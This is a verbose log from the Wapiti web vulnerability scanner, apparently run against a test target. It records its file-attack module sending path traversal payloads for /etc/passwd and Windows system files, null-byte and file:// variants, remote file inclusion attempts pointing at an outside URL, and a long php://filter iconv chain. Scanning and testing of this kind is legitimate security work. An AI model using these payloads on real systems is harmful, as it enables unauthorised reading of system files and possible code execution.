2024-03-21 12:38:55.767 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:55.954 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:56.143 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:56.324 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:56.511 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:56.704 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:56.902 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:57.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:57.281 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:57.472 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:57.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:57.846 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:58.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:58.204 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:58.379 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:58.564 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=file%3A%2F%2F%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:58.748 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:58.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:59.101 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:59.281 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:59.452 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:59.631 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:59.810 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&aiowpsec_do_log_out=1 (0)
2024-03-21 12:38:59.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-21 12:39:00.179 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-21 12:39:00.356 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%2Fetc%2Fpasswd (0)
2024-03-21 12:39:00.536 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:00.716 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%2Fetc%2Fservices (0)
2024-03-21 12:39:00.887 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:01.058 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 12:39:01.244 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-21 12:39:01.423 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-21 12:39:01.599 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:01.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:01.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-21 12:39:02.144 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-21 12:39:02.338 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-21 12:39:02.529 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 12:39:02.701 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 12:39:02.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:03.071 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:03.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 12:39:03.422 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 12:39:03.595 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:03.792 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:03.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:04.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:04.315 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:04.486 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:04.666 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-21 12:39:04.840 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 12:39:05.022 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 12:39:05.197 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:05.375 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:05.560 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 12:39:05.734 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 12:39:05.907 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:06.081 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:06.264 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:06.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:06.616 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:06.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:06.964 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 12:39:07.141 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 12:39:07.315 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:07.508 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 12:39:07.691 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 12:39:07.864 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 12:39:08.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:08.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:08.390 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:08.561 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 12:39:08.763 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:08.933 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=1%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 12:39:09.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/?after_logout=fuzz&aiowpsec_do_log_out=file%3A%2F%2F%2Fetc%2Fpasswd (0)
